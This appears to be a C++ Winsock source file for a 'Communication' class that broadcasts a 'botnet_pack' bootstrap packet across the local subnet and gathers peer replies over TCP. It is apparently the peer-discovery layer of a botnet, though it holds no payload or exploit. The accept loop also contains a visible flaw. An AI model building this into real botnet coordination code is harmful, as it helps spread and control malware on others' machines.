#include "Communication.h"
#include "network.h"

//Private
void Communication::HandleSyncReplies()
{
	//Listen for incoming replies
	listen(tcp_sock, BACKLOG);

	//Wait for all connection
	Sleep(1000);

	//buffer for receving data
	char buf[sizeof(botnet_pack)];
	memset(buf, 0, sizeof(buf));

	fd_set current_sockets;
	FD_ZERO(&current_sockets);
	FD_SET(tcp_sock, &current_sockets);

	check(select(FD_SETSIZE, &current_sockets, NULL, NULL, NULL), "error in select");

	while (FD_ISSET(0, &current_sockets))
	{ // There is a connection
		SOCKET client_socket = accept(tcp_sock, NULL, NULL);
		recv(client_socket, buf, sizeof(buf), 0);
		NetTree->AddData(buf);
	}

	//Close listening socket
	closesocket(tcp_sock);
}

//Public
Communication::Communication()
{
	udp_sock = socket(AF_INET, SOCK_DGRAM, 0);
	check(udp_sock, "can't create udp_sock");
	
	// Create a server hint structure for the server
	sockaddr_in serverHint;
	serverHint.sin_addr.S_un.S_addr = ADDR_ANY; // Us any IP address available on the machine
	serverHint.sin_family = AF_INET; // Address format is IPv4
	serverHint.sin_port = htons(54000); // Convert from little to big endian

	// Try and bind the socket to the IP and port
	check(bind(udp_sock, (sockaddr*)&serverHint, sizeof(serverHint)), "can't bind udp socket");

	tcp_sock = socket(AF_INET, SOCK_STREAM, 0);
	check(tcp_sock, "can't create tcp_sock");

	serverHint.sin_addr.S_un.S_addr = ADDR_ANY; // Us any IP address available on the machine
	serverHint.sin_family = AF_INET; // Address format is IPv4
	serverHint.sin_port = htons(55000); // Convert from little to big endian

	check(bind(tcp_sock, (sockaddr*)&serverHint, sizeof(serverHint)), "can't bind tcp socket");
	
	NetTree = NULL;
}

Communication::~Communication()
{
	delete NetTree;
}

void Communication::Sync()
{
	//TODO - multiple networks
	ULONG32 host, netmask;

	char buf[sizeof(struct botnet_pack)];
	struct botnet_pack* p = (struct botnet_pack*)buf;
	struct sockaddr_in addr;

	memset(buf, 0, sizeof(buf));
	memset(&addr, 0, sizeof(addr));

	//Calculating Broadcast IP
	host = InterfaceList[1].iiAddress.AddressIn.sin_addr.S_un.S_addr;
	netmask = InterfaceList[1].iiNetmask.AddressIn.sin_addr.S_un.S_addr;

	addr.sin_family = AF_INET;
	addr.sin_port = htons(54000);
	addr.sin_addr.S_un.S_addr = ~((netmask | host) ^ host);

	// Adding data to the packet (TODO)
	p->boot_strap = 1;
	
	//Send broadcast request for sync
	sendto(udp_sock, buf, sizeof(buf), 0, (struct sockaddr*)&addr, sizeof(addr));

	HandleSyncReplies();
}

